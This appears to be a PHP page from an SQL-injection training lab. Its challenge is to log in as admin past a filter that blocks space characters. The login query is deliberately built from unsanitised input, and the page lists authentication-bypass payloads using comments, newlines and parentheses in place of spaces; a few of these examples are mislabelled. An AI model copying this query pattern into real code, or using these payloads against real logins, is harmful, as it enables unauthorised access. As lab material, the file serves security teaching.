<?php
// Level 15: Space Filter Bypass - No Spaces Allowed
// Goal: Bypass space character filtering in SQL injection

session_start();

require_once __DIR__ . '/includes/helpers.php';
// Database connection
$host = $_ENV['DB_HOST'] ?? 'db';
$user = $_ENV['DB_USER'] ?? 'webapp'; 
$pass = $_ENV['DB_PASS'] ?? 'webapp123';
$dbname = $_ENV['DB_NAME'] ?? 'sqli_lab';

$conn = new mysqli($host, $user, $pass, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$message = "";
$success = false;
$detected_spaces = false;

if ($_POST) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Check for space characters
    if (strpos($username, ' ') !== false || strpos($password, ' ') !== false) {
        $detected_spaces = true;
        $message = " Security Filter: Space characters are not allowed!<br>";
        $message .= " Detected spaces in: ";
        $space_locations = [];
        if (strpos($username, ' ') !== false) $space_locations[] = "username";
        if (strpos($password, ' ') !== false) $space_locations[] = "password";
        $message .= implode(', ', $space_locations) . "<br>";
        $message .= " Try alternative space bypasses!";
    } else {
        // VULNERABLE query (if space filter is bypassed)
        $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
        
        try {
            $result = $conn->query($sql);
            
            if ($result && $result->num_rows > 0) {
                $user_data = $result->fetch_assoc();
                
                if ($user_data['role'] === 'admin') {
                    $success = true;
                    $flag = get_flag_for_level(15);
                    $message = "Great job! You bypassed the space filter and reached admin.<br>";
                    $message .= "<strong>Flag:</strong> <code>" . htmlspecialchars($flag) . "</code><br>";
                    $message .= "No spaces detected in your payload.<br>";
                    $message .= "SQL query: <code>" . htmlspecialchars($sql) . "</code><br>";
                    $message .= "Administrator access achieved without spaces!";
                } else {
                    $message = "Login successful as: " . htmlspecialchars($user_data['username']) . " (" . htmlspecialchars($user_data['role']) . ")";
                    $message .= "<br>You still need the admin role to get the flag.";
                }
            } else {
               $message = "Authentication failed: no matching user found.";
                $message .= "<br>SQL query: <code>" . htmlspecialchars($sql) . "</code>";
            }
            
        } catch (Exception $e) {
            $message = "SQL error: " . $e->getMessage();
            $message .= "<br>SQL query: <code>" . htmlspecialchars($sql) . "</code>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 15 - Space Filter Bypass | SQL Injection Lab</title>
    <link rel="stylesheet" href="css/styles.css">
    <style>
        .space-container {
            max-width: 750px;
            margin: 2rem auto;
            background: #18181b;
            color: #e2e8f0;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 8px 25px rgba(24, 24, 27, 0.4);
            border: 1px solid #ef4444;
        }
        
        .space-info {
            background: #0a0a0a;
            border: 2px solid #ef4444;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            color: #fca5a5;
        }
        
        .bypass-techniques {
            background: #0a0a0a;
            border: 2px solid #ef4444;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            color: #fca5a5;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
        }
        
        .technique {
            margin: 0.5rem 0;
            padding: 0.5rem;
            background: #1f1f23;
            border-radius: 4px;
            border-left: 3px solid #ef4444;
        }
        
        .form-group input {
            background: #0a0a0a;
            color: #e2e8f0;
            border: 2px solid #ef4444;
        }
        
        .form-group input:focus {
            border-color: #f87171;
            box-shadow: 0 0 0 3px rgba(248, 113, 113, 0.2);
        }
        
        .submit-btn {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            padding: 1rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .submit-btn:hover {
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
        }
        
        .space-detector {
            background: #1f1f23;
            border: 2px solid #f87171;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            text-align: center;
            font-weight: bold;
            color: #fca5a5;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #18181b 100%);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 15 - Space Filter Bypass</h1>
            <p>Exploit SQL injection without using space characters</p>
            <a href="index.php" class="back-btn">&larr; Back to Labs</a>
        </div>
        
        <div class="space-container">
            <div class="space-info">
                <h4> Space Filter Challenge</h4>
                <p>This system blocks all inputs containing space characters.</p>
                <p><strong>Goal:</strong> Achieve SQL injection without using any spaces!</p>
            </div>
            
            <div class="space-detector">
                 SPACE CHARACTER DETECTOR ACTIVE <br>
                All inputs will be scanned for space characters (ASCII 32)
            </div>
            
            <div class="bypass-techniques">
                <strong> Space Bypass Techniques:</strong><br>
                
                <div class="technique">
                    <strong>1. Tab Character:</strong><br>
                    admin'/**/OR/**/'x'='x  admin'	OR	'x'='x
                </div>
                
                <div class="technique">
                    <strong>2. Newline Characters:</strong><br>
                    admin'%0AOR%0A'x'='x  admin'<br>OR<br>'x'='x
                </div>
                
                <div class="technique">
                    <strong>3. Comment-based Spacing:</strong><br>
                    admin'/**/OR/**/'x'='x  admin'/*comment*/OR/*comment*/'x'='x
                </div>
                
                <div class="technique">
                    <strong>4. Parentheses Grouping:</strong><br>
                    admin'OR('x'='x')  admin'OR('x'='x')
                </div>
                
                <div class="technique">
                    <strong>5. Plus Sign (URL encoded):</strong><br>
                    admin'+OR+'x'='x  admin' OR 'x'='x
                </div>
            </div>
            
            <?php if ($message): ?>
                <div class="message <?= $success ? 'success' : (stripos($message, 'error') !== false ? 'error' : 'info') ?>">
                    <?= $message ?>
                </div>
            <?php endif; ?>
            
            <h3> Space-Free Login</h3>
            <form method="POST" class="login-form">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" placeholder="Enter username (NO SPACES!)" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="text" id="password" name="password" placeholder="Enter password (NO SPACES!)" required>
                </div>
                
                <button type="submit" class="submit-btn">Login</button>
            </form>
        </div>
        
        <?= render_hint_section(get_level_hints(15), 'Hints for Level 15'); ?>
        
        <div class="navigation">
            <a href="level14.php">&larr; Previous Level</a>
            <a href="level16.php">Next Level &rarr;</a>
        </div>
    </div>
</body>
</html>

<?php $conn->close(); ?>


